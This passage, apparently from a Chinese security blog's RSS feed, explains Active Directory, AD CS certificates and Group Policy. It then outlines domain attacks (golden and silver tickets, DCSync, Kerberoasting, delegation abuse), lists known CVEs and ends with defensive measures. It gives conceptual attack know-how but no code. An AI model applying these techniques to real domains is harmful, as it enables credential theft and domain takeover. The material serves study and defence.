+&lt;p&gt;组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU 包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。&lt;/p&gt;
+&lt;h2 id=&#34;active-directory&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#active-directory&#34;&gt;#&lt;/a&gt; Active Directory&lt;/h2&gt;
+&lt;p&gt;活动目录 (Active Directory，AD) 是面向 Windows Server 的目录服务。Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。&lt;/p&gt;
+&lt;h3 id=&#34;adds&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#adds&#34;&gt;#&lt;/a&gt; ADDS&lt;/h3&gt;
+&lt;p&gt;Active Directory 提供目录服务的组件被称作 Active Directory 域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。&lt;/p&gt;
+&lt;p&gt;从逻辑上看，ADDS 的组件可以分为 Partition、Schema、Domain、Domain tree、Forest、OU、Container。&lt;/p&gt;
+&lt;p&gt;Partition 也被称为 naming context，是 AD DS 数据库的一部分。Schema 是存储在 ADDS 中数据的定义。Container 是为 ADDS 提供组织框架的对象。&lt;/p&gt;
+&lt;p&gt;从实现上区分，ADDS 可以分为 Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。&lt;/p&gt;
+&lt;p&gt;每个域控制器都有完整的 ADDS 数据，每个域控都可以处理数据的修改并同步至其他的域控。&lt;/p&gt;
+&lt;p&gt;域控会有一份数据拷贝 (Data store) ，默认存储在  &lt;code&gt;C:\Windows\NTDS&lt;/code&gt;  目录下。&lt;/p&gt;
+&lt;p&gt;Global catalog server 是存储全局 catalog 的域控，catlog 以只读的方式存储了一个 multiple-domain forest 的所有对象，用于加速搜索。&lt;/p&gt;
+&lt;h3 id=&#34;名称空间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#名称空间&#34;&gt;#&lt;/a&gt; 名称空间&lt;/h3&gt;
+&lt;p&gt;名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息。&lt;/p&gt;
+&lt;h3 id=&#34;对象与属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#对象与属性&#34;&gt;#&lt;/a&gt; 对象与属性&lt;/h3&gt;
+&lt;p&gt;ADDS 内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征。&lt;/p&gt;
+&lt;h2 id=&#34;adcs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#adcs&#34;&gt;#&lt;/a&gt; ADCS&lt;/h2&gt;
+&lt;h3 id=&#34;介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h3&gt;
+&lt;p&gt;Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务。&lt;/p&gt;
+&lt;h3 id=&#34;证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书&#34;&gt;#&lt;/a&gt; 证书&lt;/h3&gt;
+&lt;p&gt;ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等。&lt;/p&gt;
+&lt;p&gt;证书常用的属性由下述字段组成&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Subject：主题&lt;/li&gt;
+&lt;li&gt;Public Key：公钥&lt;/li&gt;
+&lt;li&gt;Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)&lt;/li&gt;
+&lt;li&gt;...&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;常用的 EKU OID 包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;代码签名
+&lt;ul&gt;
+&lt;li&gt;OID 1.3.6.1.5.5.7.3.3&lt;/li&gt;
+&lt;li&gt;证书用于签署可执行代码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;加密文件系统
+&lt;ul&gt;
+&lt;li&gt;OID 1.3.6.1.4.1.311.10.3.4&lt;/li&gt;
+&lt;li&gt;证书用于加密文件系统&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;安全电子邮件
+&lt;ul&gt;
+&lt;li&gt;OID 1.3.6.1.5.5.7.3.4&lt;/li&gt;
+&lt;li&gt;证书用于加密电子邮件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;客户端身份验证
+&lt;ul&gt;
+&lt;li&gt;OID 1.3.6.1.5.5.7.3.2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;智能卡登录
+&lt;ul&gt;
+&lt;li&gt;OID 1.3.6.1.4.1.311.20.2.2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;服务器认证
+&lt;ul&gt;
+&lt;li&gt;OID 1.3.6.1.5.5.7.3.1&lt;/li&gt;
+&lt;li&gt;证书用于识别服务器 (例如 HTTPS 证书)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;证书模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书模板&#34;&gt;#&lt;/a&gt; 证书模板&lt;/h4&gt;
+&lt;p&gt;微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。&lt;/p&gt;
+&lt;h4 id=&#34;证书注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书注册&#34;&gt;#&lt;/a&gt; 证书注册&lt;/h4&gt;
+&lt;p&gt;证书可以通过以下几种方式注册：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过 Windows 客户端证书注册协议 (MS-WCCE)&lt;/li&gt;
+&lt;li&gt;通过 ICertPassage 远程协议 (MS-ICPR)&lt;/li&gt;
+&lt;li&gt;在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册&lt;/li&gt;
+&lt;li&gt;在服务器安装了对应服务时，通过证书注册服务 (CES) 注册&lt;/li&gt;
+&lt;li&gt;在服务器安装了对应服务时，使用网络设备注册服务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;组策略-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#组策略-2&#34;&gt;#&lt;/a&gt; 组策略&lt;/h2&gt;
+&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
+&lt;p&gt;组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。&lt;/p&gt;
+&lt;p&gt;组策略有以下功能：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;管理注册表&lt;/li&gt;
+&lt;li&gt;设置脚本&lt;/li&gt;
+&lt;li&gt;重定向文件夹&lt;/li&gt;
+&lt;li&gt;管理应用程序&lt;/li&gt;
+&lt;li&gt;指定安全选项&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;常用概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用概念&#34;&gt;#&lt;/a&gt; 常用概念&lt;/h3&gt;
+&lt;p&gt;组策略容器 (Group Policy Container，GPC) 存储在活动目录中，包含 GPO 属性、配置信息和版本等。可以通过 GPC 来查找 GPT。&lt;/p&gt;
+&lt;p&gt;组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。&lt;/p&gt;
+&lt;p&gt;其中 GPC 中的信息量少、容量小，GPT 中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。&lt;/p&gt;
+&lt;p&gt;组策略对象 (Group Policy Object, GPO) 是包含多种 Windows 组策略设置的集合，存储在 GPC 和 GPT 中。&lt;/p&gt;
+&lt;h2 id=&#34;域内攻击思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域内攻击思路&#34;&gt;#&lt;/a&gt; 域内攻击思路&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;获取域控权限
+&lt;ul&gt;
+&lt;li&gt;通过域控相关漏洞&lt;/li&gt;
+&lt;li&gt;抓 hash，尤其是域管理员、运维等高权限账号的哈希&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;控制入域机器
+&lt;ul&gt;
+&lt;li&gt;下发恶意策略控制&lt;/li&gt;
+&lt;li&gt;获取域内用户凭证&lt;/li&gt;
+&lt;li&gt;利用错误的域管理配置&lt;/li&gt;
+&lt;li&gt;域内 relay&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;获取服务票据
+&lt;ul&gt;
+&lt;li&gt;攻击 Exchange 等服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;攻击类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击类型&#34;&gt;#&lt;/a&gt; 攻击类型&lt;/h2&gt;
+&lt;h3 id=&#34;黄金票据利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黄金票据利用&#34;&gt;#&lt;/a&gt; 黄金票据利用&lt;/h3&gt;
+&lt;p&gt;在认证过程中，经过 client 与 AS 的通信会得到 TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。&lt;/p&gt;
+&lt;p&gt;黄金票据利用需要与 DC 通信，且需要获取 krbtgt 的 hash，但是可以获取任何 Kerbose 服务权限。&lt;/p&gt;
+&lt;h3 id=&#34;白银票据利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#白银票据利用&#34;&gt;#&lt;/a&gt; 白银票据利用&lt;/h3&gt;
+&lt;p&gt;白银票据（Silver Tickets）伪造利用的是 Kerberos 认证中的第三个步骤，在第三步的时候，client 会带着 ticket 向 server 的某个服务进行请求，如果验证通过就可以访问 server 上的指定服务了，这里的 ticket 是基于 client info、server session key、end time、server hash。这里 client info 已知，end time 可以构造，server session key 是 TGS 生成的，所以只要 server 的 NTLM hash 即可。银票伪造的是 TGS，只能访问指定的服务。&lt;/p&gt;
+&lt;h3 id=&#34;dcsync攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dcsync攻击&#34;&gt;#&lt;/a&gt; DCSync 攻击&lt;/h3&gt;
+&lt;p&gt;域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLWRyc3IvZjk3N2ZhYWEtNjczZS00ZjY2LWI5YmYtNDhjNjQwMjQxZDQ3&#34;&gt;DRSR&lt;/span&gt; 的同步机制。&lt;/p&gt;
+&lt;p&gt;在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。&lt;/p&gt;
+&lt;p&gt;DCSync 就是使用这种机制进行域渗透的技术，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，在 2015 年添加到 mimikatz 的一个功能，可以导出域内所有用户的 hash。&lt;/p&gt;
+&lt;p&gt;这种方式需要满足以下任一一种权限：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Administrators 组内的用户&lt;/li&gt;
+&lt;li&gt;Domain Admins 组内的用户&lt;/li&gt;
+&lt;li&gt;Enterprise Admins 组内的用户&lt;/li&gt;
+&lt;li&gt;域控制器的计算机帐户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;或者拥有特定的几条 DACL:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DS-Replication-Get-Changes&lt;/li&gt;
+&lt;li&gt;DS-Replication-Get-Changes-All&lt;/li&gt;
+&lt;li&gt;DS-Replication-Get-Changes-In-Filtered-Set&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。&lt;/p&gt;
+&lt;p&gt;对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。&lt;/p&gt;
+&lt;h3 id=&#34;dcshadow攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dcshadow攻击&#34;&gt;#&lt;/a&gt; DCShadow 攻击&lt;/h3&gt;
+&lt;p&gt;DCShadow 是由来自法国的安全研究人员 Benjamin Delpy 和 Vincent Le Toux 在 2018 年的微软蓝帽（Blue Hat）大会上提出。&lt;/p&gt;
+&lt;p&gt;DCShadow 攻击指在 Active Directory 环境下创建一个恶意的域控制器，并用它来推送恶意对象。&lt;/p&gt;
+&lt;h3 id=&#34;哈希传递攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#哈希传递攻击&#34;&gt;#&lt;/a&gt; 哈希传递攻击&lt;/h3&gt;
+&lt;p&gt;哈希传递攻击（Pass-the-Hash，PTH）是通过传递 NTLM 哈希来认证的攻击方法，常用的工具有 mimikatz 等。&lt;/p&gt;
+&lt;h3 id=&#34;票据传递攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#票据传递攻击&#34;&gt;#&lt;/a&gt; 票据传递攻击&lt;/h3&gt;
+&lt;p&gt;票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。&lt;/p&gt;
+&lt;h3 id=&#34;kerberoasting-attacks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kerberoasting-attacks&#34;&gt;#&lt;/a&gt; Kerberoasting Attacks&lt;/h3&gt;
+&lt;p&gt;Kerberoasting 攻击由 Tim Medin 在 2014 DerbyCon conference 上 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1QVXlobE4tRTVNVQ==&#34;&gt;公开&lt;/span&gt; 。指域内的任何一台主机，都可以通过查询 SPN，Kerberoasting 即是向域内的所有服务请求 TGS，然后进行暴力破解。&lt;/p&gt;
+&lt;h4 id=&#34;roasting-as-rep&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#roasting-as-rep&#34;&gt;#&lt;/a&gt; Roasting AS-REP&lt;/h4&gt;
+&lt;p&gt;该攻击枚举域中不需要 Kerberos 预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了  &lt;code&gt;DONT_REQ_PREAUTH&lt;/code&gt;  。&lt;/p&gt;
+&lt;h3 id=&#34;kerberos-delegation-attacks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kerberos-delegation-attacks&#34;&gt;#&lt;/a&gt; Kerberos Delegation Attacks&lt;/h3&gt;
+&lt;p&gt;在一个域中，A 使用 Kerberos 身份验证访问服务 B，B 再使用 A 的身份去访问 C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。&lt;/p&gt;
+&lt;p&gt;Kerberos Delegation（Kerberos 委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。&lt;/p&gt;
+&lt;h3 id=&#34;其他漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他漏洞利用&#34;&gt;#&lt;/a&gt; 其他漏洞利用&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;域用户提权 (CVE-2022-26923)&lt;/li&gt;
+&lt;li&gt;KDC bamboozling (CVE-2021-42287)&lt;/li&gt;
+&lt;li&gt;Name impersonation (CVE-2021-42278)&lt;/li&gt;
+&lt;li&gt;ProxyShell (CVE-2021-34473)&lt;/li&gt;
+&lt;li&gt;ProxyLogon (CVE-2021-26855)&lt;/li&gt;
+&lt;li&gt;PrintNightmare (CVE-2021-1675 / CVE-2021-34527)&lt;/li&gt;
+&lt;li&gt;SMBGhost (CVE-2020-0796)&lt;/li&gt;
+&lt;li&gt;Zerologon (CVE-2020-1472)&lt;/li&gt;
+&lt;li&gt;NTLM Relay (CVE-2019-1040)&lt;/li&gt;
+&lt;li&gt;永恒之蓝 (MS17-010)&lt;/li&gt;
+&lt;li&gt;域用户提权 (MS14-068)&lt;/li&gt;
+&lt;li&gt;Gpp 漏洞 (MS14-025)&lt;/li&gt;
+&lt;li&gt;SAMR 协议漏洞 (MS14-016)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;防护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防护&#34;&gt;#&lt;/a&gt; 防护&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 ATA 等商业化防护工具&lt;/li&gt;
+&lt;li&gt;安装杀毒软件、EDR 等工具&lt;/li&gt;
+&lt;li&gt;关闭高危服务&lt;/li&gt;
+&lt;li&gt;统一配置防火墙策略&lt;/li&gt;
+&lt;li&gt;对域控等高危账号使用白名单进行行为管理&lt;/li&gt;
+&lt;li&gt;检测高危操作
+&lt;ul&gt;
+&lt;li&gt;权限提升&lt;/li&gt;
+&lt;li&gt;高危账号密码修改、重置&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;行为频率建模
+&lt;ul&gt;
+&lt;li&gt;对大量尝试登录 / 信息查询进行报警&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;及时安装补丁&lt;/li&gt;
+&lt;li&gt;对特定攻击行为进行监控
+&lt;ul&gt;
+&lt;li&gt;通过 GPO 下发自启动、计划任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
